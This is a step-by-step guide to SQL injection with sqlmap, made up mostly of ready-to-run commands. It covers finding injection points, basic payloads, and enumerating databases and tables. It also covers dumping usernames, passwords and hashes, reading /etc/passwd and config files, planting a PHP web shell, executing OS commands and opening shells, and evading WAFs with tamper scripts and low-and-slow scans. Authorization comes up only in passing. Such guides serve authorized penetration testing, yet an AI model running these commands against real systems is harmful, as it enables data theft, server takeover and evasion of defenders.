# How to Approach SQL Injection

## Table of Contents

1. [Reconnaissance & Discovery](#reconnaissance--discovery)
2. [Manual Testing & Validation](#manual-testing--validation)
3. [SQLMap Basic Detection](#sqlmap-basic-detection)
4. [Enumeration Phase](#enumeration-phase)
5. [Data Extraction](#data-extraction)
6. [Post-Exploitation](#post-exploitation)
7. [Evasion & Advanced Techniques](#evasion--advanced-techniques)

---

## Phase 1: Reconnaissance & Discovery

### 1.1 Identify Potential Injection Points
```bash
# Target identification priorities:
1. URL parameters (?id=1, ?search=test)
2. POST form data (login forms, search forms)
3. HTTP headers (User-Agent, X-Forwarded-For, Cookie)
4. JSON/XML API endpoints
5. File upload parameters
```

### 1.2 Capture Requests
```bash
# Use Burp Suite or browser dev tools to capture:
# - Full HTTP request (including headers)
# - POST data structure
# - Session tokens and cookies
# - API request format

# Save request to file for SQLMap
# Example request.txt:
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123

username=admin&password=test
```

---

## Phase 2: Manual Testing & Validation

### 2.1 Quick Manual Tests
```bash
# Test with basic payloads:
'           # Single quote (look for SQL errors)
"           # Double quote
')'         # Close parenthesis
' OR 1=1--  # Basic boolean injection
' UNION SELECT 1-- # UNION test
```

### 2.2 Observe Responses
```bash
# Look for:
- SQL error messages
- Different response times
- Changes in page content
- Different HTTP status codes
- Application behavior changes
```

---

## Phase 3: SQLMap Basic Detection

### 3.1 Initial SQLMap Scan
```bash
# Start with basic detection
sqlmap -r request.txt --batch

# If no injection found, increase level and risk
sqlmap -r request.txt --level=3 --risk=2 --batch

# For time-sensitive environments
sqlmap -r request.txt --technique=B --batch  # Boolean-based only
```

### 3.2 Mark Injection Points
```bash
# Manually mark suspected injection points with asterisk (*)
# In URL: http://target.com/page?id=1*
# In POST data: username=admin*&password=test
# In Cookie: sessionid=abc123; trackingId=xyz*
```

### 3.3 Optimize Detection
```bash
# Specify DBMS if known
sqlmap -r request.txt --dbms=mysql --batch

# Use specific detection string
sqlmap -r request.txt --string="Welcome" --batch

# Handle different response codes
sqlmap -r request.txt --code=200 --batch
```

---

## Phase 4: Enumeration Phase

### 4.1 Database Discovery
```bash
# Follow this enumeration order:
1. Get current database
sqlmap -r request.txt --current-db --batch

2. List all databases
sqlmap -r request.txt --dbs --batch

3. Get current user
sqlmap -r request.txt --current-user --batch

4. Check DBA privileges
sqlmap -r request.txt --is-dba --batch
```

### 4.2 Schema Enumeration
```bash
# Enumerate tables in target database
sqlmap -r request.txt -D target_db --tables --batch

# Get interesting table structures
sqlmap -r request.txt -D target_db -T users --columns --batch
sqlmap -r request.txt -D target_db -T admin --columns --batch
sqlmap -r request.txt -D target_db -T passwords --columns --batch
```

### 4.3 Target High-Value Tables
```bash
# Common valuable table names:
- users, user, accounts, admin, administrators
- passwords, pass, pwd, credentials
- config, configuration, settings
- logs, audit, sessions
- customers, clients, members
```

---

## Phase 5: Data Extraction

### 5.1 Strategic Data Dumping
```bash
# Start with critical columns
sqlmap -r request.txt -D webapp -T users -C "username,password,email" --dump --batch

# Use conditional extraction for large tables
sqlmap -r request.txt -D webapp -T users --where="role='admin'" --dump --batch

# Limit rows for large datasets
sqlmap -r request.txt -D webapp -T logs --start=1 --stop=100 --dump --batch
```

### 5.2 Password Hash Handling
```bash
# Extract password hashes
sqlmap -r request.txt -D webapp -T users -C "username,password_hash" --dump --batch

# SQLMap will attempt to crack hashes automatically
# Check output directory for cracked passwords
```

### 5.3 Search for Sensitive Data
```bash
# Search for specific strings
sqlmap -r request.txt --search -T users -C username -S "admin" --batch

# Get schema information
sqlmap -r request.txt --schema --batch
```

---

## Phase 6: Post-Exploitation

### 6.1 File System Access
```bash
# Test file read capabilities
sqlmap -r request.txt --file-read="/etc/passwd" --batch
sqlmap -r request.txt --file-read="/var/www/html/config.php" --batch

# Attempt file write (if DBA)
sqlmap -r request.txt --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

### 6.2 Command Execution
```bash
# Try OS command execution
sqlmap -r request.txt --os-cmd="whoami" --batch
sqlmap -r request.txt --os-cmd="id" --batch

# Get interactive shells
sqlmap -r request.txt --os-shell --batch
sqlmap -r request.txt --sql-shell --batch
```

### 6.3 Database Takeover
```bash
# Full database dump (if time permits)
sqlmap -r request.txt --dump-all --exclude-sysdbs --batch

# Extract all user credentials
sqlmap -r request.txt --passwords --batch
```

---

## Phase 7: Evasion & Advanced Techniques

### 7.1 WAF Bypass
```bash
# If initial scans are blocked:
1. Use tamper scripts
sqlmap -r request.txt --tamper="space2comment,randomcase" --batch

2. Reduce detection footprint
sqlmap -r request.txt --delay=3 --random-agent --batch

3. Use specific techniques
sqlmap -r request.txt --technique=T --time-sec=10 --batch  # Time-based only
```

### 7.2 Stealth Approach
```bash
# Low and slow methodology
sqlmap -r request.txt --delay=5 --timeout=30 --retries=1 --technique=B --batch

# Use proxy for monitoring
sqlmap -r request.txt --proxy="http://127.0.0.1:8080" --batch
```

### 7.3 Advanced Evasion
```bash
# Multiple evasion techniques
sqlmap -r request.txt \
  --delay=2 \
  --random-agent \
  --tamper="space2comment,randomcase,charencode" \
  --level=3 \
  --technique=BT \
  --batch
```

---

## Best Practices & Tips

### ✅ Do's
- Always start with low risk/level settings
- Save and document all successful payloads
- Test one parameter at a time initially
- Use request files instead of URL parameters
- Monitor application logs if possible
- Document all findings systematically

### ❌ Don'ts
- Don't use risk level 3 on production systems
- Don't run aggressive scans during business hours
- Don't ignore rate limiting/WAF detection
- Don't extract unnecessary large datasets
- Don't leave backdoors or shells behind

### 🔧 Troubleshooting Common Issues

```bash
# Issue: No injection detected
Solution: Increase level/risk, try different techniques
sqlmap -r request.txt --level=5 --risk=2 --technique=BEUST --batch

# Issue: WAF blocking requests
Solution: Use evasion techniques
sqlmap -r request.txt --tamper="space2comment,randomcase" --delay=3 --batch

# Issue: Time-based detection slow
Solution: Optimize time-based settings
sqlmap -r request.txt --technique=T --time-sec=5 --timeout=20 --batch

# Issue: Large datasets timing out
Solution: Use conditional/limited extraction
sqlmap -r request.txt -D db -T table --where="id BETWEEN 1 AND 100" --dump --batch
```

### 📊 Progress Tracking Template

```bash
# Phase 1: Discovery
[ ] Injection points identified
[ ] Requests captured and saved
[ ] Manual testing completed

# Phase 2: Detection
[ ] SQLMap basic scan completed
[ ] Injection confirmed and technique identified
[ ] DBMS fingerprinted

# Phase 3: Enumeration
[ ] Current database identified
[ ] Database list obtained
[ ] Target tables identified
[ ] Column structures mapped

# Phase 4: Extraction
[ ] Critical data extracted
[ ] User credentials obtained
[ ] Sensitive files identified

# Phase 5: Post-Exploitation
[ ] File system access tested
[ ] Command execution attempted
[ ] Persistence established (if authorized)
```